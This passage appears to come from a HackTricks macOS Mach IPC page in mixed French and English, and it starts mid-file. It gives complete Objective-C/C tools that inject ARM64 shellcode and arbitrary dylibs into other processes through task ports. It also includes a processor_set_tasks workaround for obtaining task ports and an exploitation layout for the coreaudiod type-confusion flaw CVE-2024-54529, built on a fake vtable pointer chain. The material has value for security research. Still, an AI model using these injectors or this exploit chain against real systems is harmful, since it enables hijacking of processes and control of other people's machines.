NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compilez** le programme précédent et ajoutez les **entitlements** pour pouvoir inject code en tant que le même user (sinon vous devrez utiliser **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Pour que cela fonctionne sur iOS, vous avez besoin de l'entitlement `dynamic-codesigning` afin de pouvoir rendre une zone mémoire écrivable exécutable.

### Dylib Injection in thread via Task port

Sur macOS, les **threads** peuvent être manipulés via **Mach** ou en utilisant **posix `pthread` api**. Le thread que nous avons généré lors de l'injection précédente a été créé en utilisant l'API Mach, donc **il n'est pas conforme posix**.

Il a été possible d'**injecter un simple shellcode** pour exécuter une commande parce que cela **n'avait pas besoin de fonctionner avec des APIs conformes posix**, seulement avec Mach. Des **injections plus complexes** nécessiteraient que le **thread** soit également **conforme posix**.

Par conséquent, pour **améliorer le thread** il devrait appeler **`pthread_create_from_mach_thread`** qui va **créer un pthread valide**. Ensuite, ce nouveau pthread pourrait **appeler dlopen** pour **charger un dylib** depuis le système, donc au lieu d'écrire un nouveau shellcode pour effectuer différentes actions il est possible de charger des bibliothèques personnalisées.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Dans cette technique un thread du processus est détourné :


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

L'appel de `task_for_pid` ou `thread_create_*` incrémente un compteur dans la struct task du kernel qui peut être consulté depuis le mode utilisateur en appelant task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Lorsqu'une exception survient dans un thread, cette exception est envoyée à l'exception port désigné du thread. Si le thread ne la gère pas, elle est ensuite envoyée aux task exception ports. Si le task ne la gère pas, elle est envoyée au host port qui est géré par launchd (où elle sera acquittée). Cela s'appelle exception triage.

Notez qu'en fin de compte, si elle n'est pas correctement gérée, le rapport sera pris en charge par le démon ReportCrash. Cependant, il est possible qu'un autre thread dans le même task gère l'exception ; c'est ce que font des outils de crash reporting comme `PLCreashReporter`.

## Other Objects

### Clock

N'importe quel utilisateur peut accéder aux informations sur le clock ; cependant, pour régler l'heure ou modifier d'autres paramètres il faut être root.

Pour obtenir des informations, il est possible d'appeler des fonctions du sous-système `clock` comme : `clock_get_time`, `clock_get_attributtes` ou `clock_alarm`\
Pour modifier des valeurs, le sous-système `clock_priv` peut être utilisé avec des fonctions comme `clock_set_time` et `clock_set_attributes`

### Processors and Processor Set

L'API processor permet de contrôler un seul processeur logique en appelant des fonctions comme `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

De plus, l'API **processor set** fournit un moyen de grouper plusieurs processeurs en un ensemble. Il est possible de récupérer le processor set par défaut en appelant **`processor_set_default`**.\
Voici quelques API intéressantes pour interagir avec le processor set :

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

Comme mentionné dans [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), par le passé cela permettait de contourner la protection mentionnée précédemment pour obtenir des task ports dans d'autres processus afin de les contrôler en appelant **`processor_set_tasks`** et en obtenant un host port sur chaque processus.\
Aujourd'hui, il faut être root pour utiliser cette fonction et elle est protégée, vous ne pourrez donc obtenir ces ports que sur des processus non protégés.

You can try it with:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
